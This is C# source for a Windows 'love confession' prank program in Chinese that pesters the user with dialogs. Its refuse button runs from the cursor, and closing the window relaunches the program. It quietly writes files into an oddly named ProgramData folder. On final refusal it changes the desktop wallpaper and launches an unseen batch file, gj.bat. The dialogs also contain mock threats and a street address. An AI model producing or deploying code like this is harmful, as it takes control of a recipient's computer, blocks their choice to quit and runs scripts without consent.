using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace 你好_小姐姐
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        PictureBox atuf = new PictureBox();
        PictureBox atus = new PictureBox();
        PictureBox atut = new PictureBox();
        PictureBox atul = new PictureBox();
        Button utl = new Button();
        Button utr = new Button();

        public int jd = 1;

        private void Form1_Load(object sender, EventArgs e)
        {
            string path = Application.StartupPath + @"\love";
            if (File.Exists(path))
            {

            }
            else
            {
                Directory.CreateDirectory(path);
            }
            if (File.Exists(@"C:\ProgramData\234t234g3q2g43g\love.html"))
            {

            }
            else
            {
                Directory.CreateDirectory(@"C:\ProgramData\234t234g3q2g43g\");
                File.Copy(path + @"\love.html", @"C:\ProgramData\234t234g3q2g43g\love.html");
            }

            TopMost = true;
            Icon = soce.icon1;

            atuf.Dock = DockStyle.Fill;
            atus.Dock = DockStyle.Fill;
            atut.Dock = DockStyle.Fill;
            atul.Dock = DockStyle.Fill;

            atuf.BackgroundImage = soce.serges;
            atus.BackgroundImage = soce.rdgs;
            atut.BackgroundImage = soce.rdzgr;
            atul.BackgroundImage = soce.dthrdt;

            atuf.BackgroundImageLayout = ImageLayout.Zoom;
            atus.BackgroundImageLayout = ImageLayout.Zoom;
            atut.BackgroundImageLayout = ImageLayout.Zoom;
            atul.BackgroundImageLayout = ImageLayout.Zoom;

            atuf.BackColor = Color.White;
            atus.BackColor = Color.White;
            atut.BackColor = Color.White;
            atul.BackColor = Color.White;

            Controls.Add(atuf);

            utl.Text = "好啊,说来听听。";
            utr.Text = "不,我拒绝。";

            utl.Width = 120;
            utr.Width = 120;

            utl.Height = 35;
            utr.Height = 35;

            utl.Top = 620;
            utr.Top = 620;

            utl.Left = 80;
            utr.Left = 280;

            utl.Click += Utl_Click;
            utr.Click += Utr_Click;
            utr.MouseMove += Utr_MouseMove;


            utl.FlatStyle = FlatStyle.Flat;
            utr.FlatStyle = FlatStyle.Flat;

            utl.BackColor = Color.White;
            utr.BackColor = Color.White;
            utl.FlatAppearance.BorderSize = 1;
            utr.FlatAppearance.BorderSize = 1;
            utl.FlatAppearance.BorderColor = Color.Black;
            utr.FlatAppearance.BorderColor = Color.Black;
            utl.FlatAppearance.MouseOverBackColor = Color.Aqua;
            utr.FlatAppearance.MouseOverBackColor = Color.Aqua;
            utl.FlatAppearance.MouseDownBackColor = Color.Transparent;
            utr.FlatAppearance.MouseDownBackColor = Color.Transparent;

            Controls.Add(utl);
            Controls.Add(utr);

            utl.BringToFront();
            utr.BringToFront();

            util.Text = "小姐姐，小姐姐~" + "\r\n" + "有件事，我不知当讲不当讲。" + "\r\n";
        }

        private void Utr_MouseMove(object sender, MouseEventArgs e)
        {
            Random rd = new Random();
            int nlt = rd.Next(0, 650);
            int nll = rd.Next(0, 200);
            utr.Top = nlt;
            utr.Left = nll;
        }

        private void Utr_Click(object sender, EventArgs e)
        {
            if (jd == 1)
            {
                Ts(sender, e);
                atuf.Visible = false;
                Controls.Add(atus);
                utl.Text = "是啊，怎么啦？";
                utr.Text = "关你屁事！滚";
                util.Text = "向你这么漂亮的女孩，肯定有很多人追你吧。";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 2)
            {
                Ts(sender, e);
                atus.Visible = false;
                Controls.Add(atut);
                utl.Text = "嗯，然后呢！";
                utr.Text = "切，无聊";
                util.Text = "我也是其中之一哦！";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 3)
            {
                Ts(sender, e);
                atut.Visible = false;
                Controls.Add(atul);
                utl.Text = "好啊";
                utr.Text = "死流氓";
                util.Text = "我非常非常喜欢你，做我女朋友吧！";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 4)
            {
                Ts(sender, e);
                atut.Visible = false;
                Controls.Add(atul);
                utl.Text = "听你的";
                utr.Text = "去死吧";
                util.Text = "明天搬到我家来吧！我家就在北京市建国门外大街光华里社区6号楼5层。";
                utr.Top = 620;
                utr.Left = 280;
            }
        }

        private void Utl_Click(object sender, EventArgs e)
        {
            if (jd == 1)
            {
                atuf.Visible = false;
                Controls.Add(atus);
                utl.Text = "是啊，怎么啦？";
                utr.Text = "关你屁事！滚";
                util.Text = "向你这么漂亮的女孩，肯定有很多人追你吧。";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 2)
            {
                atus.Visible = false;
                Controls.Add(atut);
                utl.Text = "嗯，然后呢！";
                utr.Text = "切，无聊";
                util.Text = "我也是其中之一哦！";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 3)
            {
                atut.Visible = false;
                Controls.Add(atul);
                utl.Text = "好啊";
                utr.Text = "死流氓";
                util.Text = "我非常非常喜欢你，做我女朋友吧！";
                utr.Top = 620;
                utr.Left = 280;
                jd = jd + 1;
            }
            else if (jd == 4)
            {
                atut.Visible = false;
                Controls.Add(atul);
                utl.Text = "听你的";
                utr.Text = "去死吧";
                util.Text = "明天搬到我家来吧！我家就在北京市建国" + "\r\n" + "门外大街光华里社区6号楼5层。";
                utr.Top = 620;
                utr.Left = 280;
                uit.Interval = 2000;
                uit.Tick += Uit_Tick;
                uit.Enabled = true;
            }
        }

        Timer uit = new Timer();

        private void Uit_Tick(object sender, EventArgs e)
        {
            uit.Enabled = false;
            Last(sender, e);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (jd < 4)
            {
                MessageBox.Show("你真的确定你要拒绝吗?" + "\r\n" + "你会失去我的。", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process sa = new Process();
                sa.StartInfo.FileName = Application.ExecutablePath;
                sa.Start();
            }
            else if (jd == 4)
            {
                Environment.Exit(4040);
            }
        }

        private void Last(object sender, EventArgs e)
        {
            Process uito = new Process();
            uito.StartInfo.FileName = @"C:\ProgramData\234t234g3q2g43g\love.html";
            uito.Start();
            Environment.Exit(0);
        }

        private void Ts(object sender, EventArgs e)
        {
            if (jd == 1)
            {
                MessageBox.Show("不，你没有理由拒绝！" + "\r\n" + "来~我们进入下一环节。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);                
            }
            else if (jd == 2)
            {
                MessageBox.Show("不行，给我说有！不然锤死你！" + "\r\n" + "来~我们进入下一环节。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);                
            }
            else if (jd == 3)
            {
                MessageBox.Show("过来，我跟你商量一下，是土葬还是火葬……" + "\r\n" + "来~我们进入下一环节。", "提示", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            else if (jd == 4)
            {
                if (MessageBox.Show("emmm，再给你一次机会，否则我冒火了！" + "\r\n" + "到底去不去！", "提示", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
                {
                    MessageBox.Show("这就对了嘛，我明天等着你！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
                else
                {
                    MessageBox.Show("你惹火我了！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    gbz(sender, e);
                    ary(sender, e);
                }
            }
        }

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private void gbz(object sender, EventArgs e)
        {
            Image image = Image.FromFile(Application.StartupPath + @"\love\bz.jpg");
            if (File.Exists(@"C:\ProgramData\bz\nbz\xjj\bz.jpg"))
            {

            }
            else
            {
                Directory.CreateDirectory(@"C:\ProgramData\bz\nbz\xjj\");
            }
            image.Save(@"C:\ProgramData\bz\nbz\xjj\bz.jpg", System.Drawing.Imaging.ImageFormat.Bmp);
            SystemParametersInfo(20, 0, @"C:\ProgramData\bz\nbz\xjj\bz.jpg", 0x2);
        }

        private void ary(object sender, EventArgs e)
        {
            Process uito = new Process();
            uito.StartInfo.FileName = Application.StartupPath + @"\love\gj.bat";
            uito.Start();
            Environment.Exit(0);
        }
    }
}